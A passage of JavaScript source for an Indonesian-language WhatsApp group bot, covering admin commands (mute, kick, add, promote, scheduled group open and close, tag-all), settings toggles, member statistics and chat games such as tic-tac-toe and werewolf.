sendButtonBiasa(m.chat, `*Memasuki ${command} mode*`, `on -- _mengaktifkan_\noff -- _Menonaktifkan_`, button)
}}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'kickme':{
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
if (!isBotAdmins) return tolakk(mess.BotAdmin)
if (args[0] === "on") {
if (db.data.chats[m.chat].kickme) return m.reply(`Udah aktif`)
db.data.chats[m.chat].kickme = true
m.reply('Successfully Activate Kickme In This Group')
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].kickme) return m.reply(`Udah nonaktif`)
db.data.chats[m.chat].kickme = false
m.reply('Successfully Disabling Kickme In This Group')
} else {
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
              }
           ]
sendButtonBiasa(m.chat, `*Memasuki ${command} mode*`, `on -- _mengaktifkan_\noff -- _Menonaktifkan_`, button)
}}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'mute':{
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
if (args[0] === "on") {
if (db.data.chats[m.chat].mute) return m.reply(`Udah Mute`)
db.data.chats[m.chat].mute = true
m.reply('Successfully Mute In This Group')
}
else if (args[0] === "off") {
if (!db.data.chats[m.chat].mute) return m.reply(`Udah Unmute`)
db.data.chats[m.chat].mute = false
m.reply('Successfully Unmute In This Group')
}else {
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
              }
           ]
sendButtonBiasa(m.chat, `*Memasuki ${command} mode*`, `on -- _mengaktifkan_\noff -- _Menonaktifkan_`, button)
}}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'antidelete':{
// if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isCreator) return tolakk(mess.OnlyOwner)
//if (!isBotAdmins) return m.reply(mess.BotAdmin)
if (args[0] === "on") {
addCountCmd('antidelete', m.sender, _cmd)
if (setting.antiDelete) return m.reply(`Udah aktif`)
setting.antiDelete = true
m.reply('Successfully Activate antidelete In This bot')
} else if (args[0] === "off") {
addCountCmd('antidelete', m.sender, _cmd)
if (!setting.antiDelete) return m.reply(`Udah nonaktif`)
setting.antiDelete = false
m.reply('Successfully Disabling antidelete In This bot')
} else {
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
              }
           ]
sendButtonBiasa(m.chat, `*Memasuki ${command} mode*`, `on -- _mengaktifkan_\noff -- _Menonaktifkan_`, button)
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'antionce':case 'antivo': case 'antiviewonce':{
// if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isCreator) return tolakk(mess.OnlyOwner)
// if (!isBotAdmins) return m.reply(mess.BotAdmin)
if (args[0] === "on") {
addCountCmd('antionce', m.sender, _cmd)
if (setting.antiViewOnce) return m.reply(`Udah aktif`)
setting.antiViewOnce = true
m.reply('Successfully Activate Anti view once In This bot')
} else if (args[0] === "off") {
addCountCmd('antionce', m.sender, _cmd)
if (!setting.antiViewOnce) return m.reply(`Udah nonaktif`)
setting.antiViewOnce = false
m.reply('Successfully Disabling Anti view once In This bot')
} else {
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
              }
           ]
sendButtonBiasa(m.chat, `*Memasuki ${command} mode*`, `on -- _mengaktifkan_\noff -- _Menonaktifkan_`, button)
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'antiwame':{
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
if (!isBotAdmins) return tolakk(mess.BotAdmin)
 if (args[0] === "on") {
if (db.data.chats[m.chat].antiwame) return m.reply(`Udah aktif`)
db.data.chats[m.chat].antiwame = true
m.reply('Successfully Activate Antiwame In This Group')
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antiwame) return m.reply(`Udah nonaktif`)
db.data.chats[m.chat].antiwame = false
m.reply('Successfully Disabling Antiwame In This Group')
} else {
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
              }
           ]
sendButtonBiasa(m.chat, `*Memasuki ${command} mode*`, `on -- _mengaktifkan_\noff -- _Menonaktifkan_`, button)
}}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'antiwame2':{
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
if (!isBotAdmins) return tolakk(mess.BotAdmin)
 if (args[0] === "on") {
if (db.data.chats[m.chat].antiwame2) return m.reply(`Udah aktif`)
db.data.chats[m.chat].antiwame2 = true
m.reply('Successfully Activate antiwame2 In This Group')
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antiwame2) return m.reply(`Udah nonaktif`)
db.data.chats[m.chat].antiwame2 = false
m.reply('Successfully Disabling antiwame2 In This Group')
} else {
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
              }
           ]
sendButtonBiasa(m.chat, `*Memasuki ${command} mode*`, `on -- _mengaktifkan_\noff -- _Menonaktifkan_`, button)
}}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'opentime': {
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk('Lu Siapa Kocak')
if (!isBotAdmins) return tolakk(mess.BotAdmin)
if (args[1] == 'detik') {
var timer = args[0] * `1000`
} else if (args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'hari') {
var timer = args[0] * `86400000`
} else {
return warning('*Pilih:*\ndetik\nmenit\njam\n\n*Contoh*\n10 detik')
}
m.reply(`Grup Akan Dibuka Dalam ${q} Dimulai Dari Sekarang`)
setTimeout(() => {
var nomor = m.participant
const open = `Grup Telah Di Buka Oleh Admin\nSekarang Semua Member Dapat Mengirim Pesan`
vreden.groupSettingUpdate(m.chat, 'not_announcement')
m.reply(open)
}, timer)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'open': case 'buka':{
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
if (!isBotAdmins) return tolakk(mess.BotAdmin)
addCountCmd('group', m.sender, _cmd)
vreden.groupSettingUpdate(m.chat, 'not_announcement')
const textOpen = await getTextSetOpen(m.chat, set_open);
m.reply(textOpen || `Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
db.data.users[m.sender].exp += await randomNomor(20)
break
}
case 'setopen':{
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isCreator) return tolakk(mess.OnlyOwner)
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *teks open*\n\n_Contoh_\n\n${prefix+command} Halo Semuanya, group sudah buka`)
if (isSetOpen(m.chat, set_open)) return m.reply(`Set open sudah ada sebelumnya`)
addSetOpen(text, m.chat, set_open)
addCountCmd('setopen', m.sender, _cmd)
m.reply(`✅ Done set open!`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'changeopen': case 'changesetopen':
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isCreator) return tolakk(mess.OnlyOwner)
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *teks open*\n\n_Contoh_\n\n${prefix+command} Halo Semuanya, group sudah buka`)
if (isSetOpen(m.chat, set_open)) {
addCountCmd('changeopen', m.sender, _cmd)
changeSetOpen(text, m.chat, set_open)
m.reply(`Sukses ubah set open teks!`)
} else {
addCountCmd('changeopen', m.sender, _cmd)
addSetOpen(text, m.chat, set_open)
m.reply(`Sukses ubah set open teks!`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'delsetopen':
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isCreator) return tolakk(mess.OnlyOwner)
if (!isSetOpen(m.chat, set_open)) return warning(`Belum ada set open di sini..`)
removeSetOpen(m.chat, set_open)
addCountCmd('delsetopen', m.sender, _cmd)
m.reply(`Sukses delete set open`)
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'tutupjam': {
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk('Lu Siapa Kocak')
if (!isBotAdmins) return tolakk(mess.BotAdmin)
var jm = text.split(':')[0]
var mnt = text.split(':')[1]
if (jm > 23) return warning(`Masukan Waktu dengan benar\n*Contoh:*\n\n.tutupjam 18:00`)
if (mnt > 59) return warning(`Masukan Waktu dengan benar\n*Contoh:*\n\n.tutupjam 18:00`)
if ((isNaN(jm))) return warning(`Masukan Waktu dengan benar\n*Contoh:*\n\n.bukajam 18:00`)
if ((isNaN(mnt))) return warning(`Masukan Waktu dengan benar\n*Contoh:*\n\n.bukajam 18:00`)
if (!jm && !mnt) return warning(`Masukan Jam nya\n*Contoh:*\n\n.tutupjam 18:00`)
m.reply(`Group Akan Ditutup Jam ${jm}:${mnt} WIB`)
cron.schedule(`0 ${mnt} ${jm} * * *`, async () => {
vreden.groupSettingUpdate(m.chat, 'announcement')
m.reply(`Grup Di Tutup Oleh Admin\nSekarang Hanya Admin Yang Dapat Mengirim Pesan`)
}, { scheduled: true, timezone: 'Asia/Jakarta' })
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'bukajam': {
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk('Lu Siapa Kocak')
if (!isBotAdmins) return tolakk(mess.BotAdmin)
var jm = text.split(':')[0]
var mnt = text.split(':')[1]
if (jm > 23) return warning(`Masukan Waktu dengan benar\n*Contoh:*\n\n.bukajam 18:00`)
if (mnt > 59) return warning(`Masukan Waktu dengan benar\n*Contoh:*\n\n.bukajam 18:00`)
if ((isNaN(jm))) return warning(`Masukan Waktu dengan benar\n*Contoh:*\n\n.bukajam 18:00`)
if ((isNaN(mnt))) return warning(`Masukan Waktu dengan benar\n*Contoh:*\n\n.bukajam 18:00`)
if (!jm && !mnt) return warning(`Masukan Jam nya\n*Contoh:*\n\n.bukajam 18:00`)
m.reply(`Group Akan Dibuka Jam ${jm}:${mnt} WIB`)
cron.schedule(`0 ${mnt} ${jm} * * *`, async () => {
vreden.groupSettingUpdate(m.chat, 'not_announcement')
m.reply(`Grup Di Buka Oleh Admin\nSekarang Semua Peserta Dapat Mengirim Pesan`)
}, { scheduled: true, timezone: 'Asia/Jakarta' })
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'closetime': {
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk('Lu Siapa Kocak')
if (!isBotAdmins) return tolakk(mess.BotAdmin)
if (args[1] == 'detik') {
var timer = args[0] * `1000`
} else if (args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'hari') {
var timer = args[0] * `86400000`
} else {
return warning('*Pilih:*\ndetik\nmenit\njam\n\n*Contoh*\n10 detik')
}
m.reply(`Group Akan Ditutup Dalam ${q} Di Mulai Dari Sekarang`)
setTimeout(() => {
var nomor = m.participant
const close = `Grup Di Tutup Oleh Admin\nSekarang Hanya Admin Yang Dapat Mengirim Pesan`
vreden.groupSettingUpdate(m.chat, 'announcement')
m.reply(close)
}, timer)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'close': case 'tutup':
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
if (!isBotAdmins) return tolakk(mess.BotAdmin)
addCountCmd('close', m.sender, _cmd)
vreden.groupSettingUpdate(m.chat, 'announcement')
const textClose = await getTextSetClose(m.chat, set_close);
m.reply(textClose || `Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'setclose':{
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isCreator) return tolakk(mess.OnlyOwner)
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *teks close*\n\n_Contoh_\n\n${prefix+command} Halo Semuanya, group close dulu ya`)
if (isSetClose(m.chat, set_close)) return m.reply(`Set close sudah ada sebelumnya`)
addSetClose(text, m.chat, set_close)
addCountCmd('setclose', m.sender, _cmd)
m.reply(`✅ Done set close!`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'changeclose': case 'changesetclose':
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isCreator) return tolakk(mess.OnlyOwner)
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *teks close*\n\n_Contoh_\n\n${prefix+command} Halo Semuanya, group close dulu ya`)
if (isSetClose(m.chat, set_close)) {
addCountCmd('changeclose', m.sender, _cmd)
changeSetClose(text, m.chat, set_close)
m.reply(`Sukses ubah set close teks!`)
} else {
addCountCmd('changeclose', m.sender, _cmd)
addSetClose(text, m.chat, set_close)
m.reply(`Sukses ubah set close teks!`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'delsetclose':
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isCreator) return tolakk(mess.OnlyOwner)
if (!isSetClose(m.chat, set_close)) return warning(`Belum ada set close di sini..`)
removeSetClose(m.chat, set_close)
addCountCmd('delsetclose', m.sender, _cmd)
m.reply(`Sukses delete set close`)
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'cekasalmember': {
if (!m.isGroup) return warning(mess.OnlyGrup)
  const participants = await vreden.groupMetadata(m.chat).then(metadata => metadata.participants);
  let countIndonesia = 0;
  let countMalaysia = 0;
  let countUSA = 0;
  let countOther = 0;
  
  participants.forEach(participant => {
    const phoneNumber = participant.id.split('@')[0];
    if (phoneNumber.startsWith("62")) {
      countIndonesia++;
    } else if (phoneNumber.startsWith("60")) {
      countMalaysia++;
    } else if (phoneNumber.startsWith("1")) {
      countUSA++;
    } else if (phoneNumber.startsWith("+1")) {
      countOther++;
    } else {
      countOther++;
    }
  });
  
  const replyMessage = `*GLOBAL COUNTRY MEMBER:*\n\nMember Indonesia: ${countIndonesia} 🇮🇩\nMember Malaysia: ${countMalaysia} 🇲🇾\nMember Amerika: ${countUSA} 🇺🇲\nOther Member Country: ${countOther} 🏳️`;
  balas(replyMessage);
  }
  break;
case 'sider': case 'gcsider': {
var lama = 86400000 * 7
    const now = new Date().toLocaleString("en-US", {
        timeZone: "Asia/Jakarta"
    });
    const milliseconds = new Date(now).getTime();

    let member = groupMetadata.participants.map(v => v.id)
    if (!text) {
        var pesan = "Harap aktif di grup karena akan ada pembersihan member setiap saat"
    } else {
        var pesan = text
    }
    var sum
    sum = member.length
    var total = 0
    var sider = []
    for (let i = 0; i < sum; i++) {
        let users = m.isGroup ? groupMetadata.participants.find(u => u.id == member[i]) : {}
        if ((typeof global.db.data.users[member[i]] == 'undefined' || milliseconds * 1 - global.db.data.users[member[i]].lastseen > lama) && !users.isAdmin && !users.isSuperAdmin) {
            if (typeof global.db.data.users[member[i]] !== 'undefined') {
                if (global.db.data.users[member[i]].banned == true) {
                    total++
                    sider.push(member[i])
                }
            } else {
                total++
                sider.push(member[i])
            }
        }
    }
    if (total == 0) return m.reply(`*Digrup ini tidak terdapat sider.*`)
    mbales(`*${total}/${sum}* anggota grup *${await vreden.getName(m.chat)}* adalah sider dengan alasan :\n1. Tidak aktif selama lebih dari 7 hari\n2. Baru join tetapi tidak pernah nimbrung\n\n_“${pesan}”_\n\n*LIST SIDER :*\n${sider.map(v => '  ○ @' + v.replace(/@.+/, '' + typeof global.db.data.users[v] == "undefined" ? ' Sider ' : ' Off ' + msToDate(milliseconds * 1 - global.db.data.users[v].lastseen))).join('\n')}`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'hedsot': case 'buang': case 'kick': {
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isCreator && !isAdmins) return tolakk(mess.GrupAdmin)
if (!isBotAdmins) return tolakk(mess.BotAdmin)
if (!m.quoted && !m.mentionedJid[0] && isNaN(parseInt(args[0]))) return warning('Tag/reply pesan target yang ingin di kick!')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (ownerNumber.includes(users)) return warning('Tidak Dapat Melakukannya Kepada Owner')
if (!m.mentionedJid[0] && !m.quoted && !text) return warning(`Tag/Reply Target Yang Mau Di ${command}`)
await vreden.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply('🗿 Done Kick :v')).catch((err) => m.reply('Tag/reply pesan target yang ingin di kick!'))
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'add': {
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isCreator && !isAdmins) return tolakk(mess.GrupAdmin)
if (!isBotAdmins) return tolakk(mess.BotAdmin)
if (!m.quoted && !m.mentionedJid[0] && isNaN(parseInt(args[0]))) return warning('Tag/reply pesan target yang ingin di add!')
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (!m.mentionedJid[0] && !m.quoted && !text) return warning(`Tag/Reply Target Yang Mau Di ${command}`)
await vreden.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply('Sukses Add Sepuh ✅')).catch((err) => m.reply('❌ Terjadi kesalahan, mungkin nmr nya privat'))
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'promote': case 'pm': {
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isCreator && !isAdmins) return tolakk(mess.GrupAdmin)
if (!isBotAdmins) return tolakk(mess.BotAdmin)
if (!m.quoted && !m.mentionedJid[0] && isNaN(parseInt(args[0]))) return warning('Tag/reply pesan target yang ingin di jadikan admin!')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (!m.mentionedJid[0] && !m.quoted && !text) return warning(`Tag/Reply Target Yang Mau Di ${command}`)
await vreden.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply('Sukses promote member✅')).catch((err) => m.reply('❌ Terjadi kesalahan'))
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'demote': case 'dm': {
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isCreator && !isAdmins) return tolakk(mess.GrupAdmin)
if (!isBotAdmins) return tolakk(mess.BotAdmin)
if (!m.quoted && !m.mentionedJid[0] && isNaN(parseInt(args[0]))) return warning('Tag/reply pesan target yang ingin di un admin!')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (!m.mentionedJid[0] && !m.quoted && !text) return warning(`Tag/Reply Target Yang Mau Di ${command}`)
await vreden.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply('Sukses demote admin✅')).catch((err) => m.reply('❌ Terjadi kesalahan'))
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'revoke':
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
if (!isBotAdmins) return tolakk(mess.BotAdmin)
addCountCmd('revoke', m.sender, _cmd)
await vreden.groupRevokeInvite(m.chat)
.then( res => {
m.reply(`Sukses menyetel tautan undangan grup ini`)
}).catch(() => m.reply(mess.error.api))
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'tagall': {
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk ('Lu Siapa?') 
if (!isBotAdmins) return tolakk ('Bot Harus Jad Admin!') 
let teks = `*👥 Tag All By Admin*
 
🗞️ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `• @${mem.id.split('@')[0]}\n`
}
vreden.sendMessage(m.chat, {
text: teks,
mentions: participants.map(a => a.id)
}, {
quoted: m
})
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case'totag': {
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
if (!isBotAdmins) return warning('Bot Harus Admin!')
               if (!m.quoted) return warning(`Replay Pesan Dengan Caption ${prefix + command}`)
               vreden.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
               db.data.users[m.sender].exp += await randomNomor(20)
break
case 'h': case 'hidetag': {
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
if (m.quoted) {
vreden.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
}
if (!m.quoted) {
vreden.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: fconver })
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'delete': case 'd': case 'del': {
if (!m.quoted) return m.reply('Reply pesan yang mau di hapus')
await vreden.sendMessage(m.chat, { delete: { remoteJid: m.chat, id: m.quoted.id, participant: m.quoted.sender } })
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'checksewa': case 'ceksewa': {
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isSewa) return tolakk(`Bot tidak di sewa group ini!`)
addCountCmd('checksewa', m.sender, _cmd)
let ceksewa = ms(_sewa.getSewaExpired(m.chat, sewa) - Date.now())
let sewanya = `*Expire :* ${ceksewa.days} day(s) ${ceksewa.hours} hour(s) ${ceksewa.minutes} minute(s)`
m.reply(sewanya)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
// Game Menu
case 'tebakbom': case 'petakbom': {
if (petakbom[m.sender]) return m.reply(`Game mu masih belum terselesaikan, lanjutkan yukk\n\n${petakbom[sender].board.join("")}\n\nKirim ${prefix}delpetakbom untuk menghapus game petak bom`);
function shuffle(array) {
return array.sort(() => Math.random() - 0.5);
}
petakbom[m.sender] = {
petak: shuffle([0, 0, 0, 2, 0, 2, 0, 2, 0]),
board: ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣"],
bomb: 3,
lolos: 6,
pick: 0,
hadiah: randomNomor(5000, 10000),
nyawa: ["❤️", "❤️", "❤️"]
};
await balas(`*PETAK BOM*

${petakbom[m.sender].board.slice(0, 3).join("")}
${petakbom[m.sender].board.slice(3, 6).join("")}
${petakbom[m.sender].board.slice(6).join("")}

Pilih lah nomor tersebut! dan jangan sampai terkena Bom!
Bomb : ${petakbom[m.sender].bomb}
Nyawa : ${petakbom[m.sender].nyawa.join("")}`);
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'deltebakbom': case 'delpetakbom': {
if (!(petakbom[m.sender])) return balas(`kamu sedang tidak bermain petakbom!`)
delete petakbom[m.sender];
m.reply(`Petakbom di akhiri, hadiah Rp. 0`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'ttc': case 'ttt': case 'tictactoe': {
if (!m.isGroup) return warning(mess.OnlyGrup)
let TicTacToe = require("./lib/tictactoe")
this.game = this.game ? this.game : {}
if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return warning( 'Kamu masih didalam game')
let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
if (room) {
m.reply('Partner ditemukan!')
room.o = m.chat
room.game.playerO = m.sender
room.state = 'PLAYING'
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if (room.x !== room.o) await vreden.sendText(room.x, str, m, { mentions: parseMention(str) } )
await vreden.sendText(room.o, str, m, { mentions: parseMention(str) } )
} else {
room = {
id: 'tictactoe-' + (+new Date),
x: m.chat,
o: '',
game: new TicTacToe(m.sender, 'o'),
state: 'WAITING'
}
if (text) room.name = text
m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${prefix+command} ${text}` : ''))
this.game[room.id] = room
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'delttc': case 'delttt': {
let roomnya = Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))
if (!roomnya) return warning ( `Kamu sedang tidak berada di room tictactoe !`)
delete this.game[roomnya.id]
m.reply(`Berhasil delete session room tictactoe !`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'suitpvp': case 'suit': {
if (!m.isGroup) return warning(mess.OnlyGrup)
if (m.mentionedJid[0] === m.sender) return warning(`Tidak bisa bermain dengan diri sendiri !`)
if (!m.mentionedJid[0]) return warning(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @0`, m.chat, { mentions: '0@s.whatsapp.net' })
this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return warning(`Orang yang kamu tantang sedang bermain suit bersama orang lain`)
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
this.suit[id] = {
chat: await m.reply(caption),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) m.reply(`_Waktu suit habis_`)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'wwpc':
case 'ww':
case 'werewolf': {
if (!m.isGroup) return warning(mess.OnlyGrup)
let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};

let {
    emoji_role,
    sesi,
    playerOnGame,
    playerOnRoom,
    playerExit,
    dataPlayer,
    dataPlayerById,
    getPlayerById,
    getPlayerById2,
    killWerewolf,
    killww,
    dreamySeer,
    sorcerer,
    protectGuardian,
    roleShuffle,
    roleChanger,
    roleAmount,
    roleGenerator,
    addTimer,
    startGame,
    playerHidup,
    playerMati,
    vote,
    voteResult,
    clearAllVote,
    getWinner,
    win,
    pagi,
    malam,
    skill,
    voteStart,
    voteDone,
    voting,
    run,
    run_vote,
    run_malam,
    runprefixagi
} = require('./lib/werewolf.js')

// [ Thumbnail ] 
let thumb = "https://user-images.githubusercontent.com/72728486/235316834-f9f84ba0-8df3-4444-81d8-db5270995e6d.jpg";

    const {
        sender,
        chat
    } = m;
    vreden.werewolf = vreden.werewolf ? vreden.werewolf : {};
    const ww = vreden.werewolf ? vreden.werewolf : {};
    const data = ww[chat];
    const value = args[0];
    const target = args[1];
let byId = getPlayerById2(sender, parseInt(target), ww); 
    // [ Membuat Room ]
    if (value === "create") {
        if (chat in ww) return reply("Group masih dalam sesi permainan");
        if (playerOnGame(sender, ww) === true)
            return reply("Kamu masih dalam sesi game");
        ww[chat] = {
            room: chat,
            owner: sender,
            status: false,
            iswin: null,
            cooldown: null,
            day: 0,
            time: "malem",
            player: [],
            dead: [],
            voting: false,
            seer: false,
            guardian: [],
        };
        await reply("Room berhasil dibuat, ketik *.ww join* untuk bergabung");

        // [ Join sesi permainan ]
    } else if (value === "join") {
        if (!ww[chat]) return reply("Belum ada sesi permainan");
        if (ww[chat].status === true)
            return reply("Sesi permainan sudah dimulai");
        if (ww[chat].player.length > 16)
            return reply("Maaf jumlah player telah penuh");
        if (playerOnRoom(sender, chat, ww) === true)
            return reply("Kamu sudah join dalam room ini");
        if (playerOnGame(sender, ww) === true)
            return reply("Kamu masih dalam sesi game");
        let data = {
            id: sender,
            number: ww[chat].player.length + 1,
            sesi: chat,
            status: false,
            role: false,
            effect: [],
            vote: 0,
            isdead: false,
            isvote: false,
        };
        ww[chat].player.push(data);
        let player = [];
        let text = `\n*⌂ W E R E W O L F - P L A Y E R*\n\n`;
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )}\n`;
            player.push(ww[chat].player[i].id);
        }
        text += "\nJumlah player minimal adalah 5 dan maximal 15";
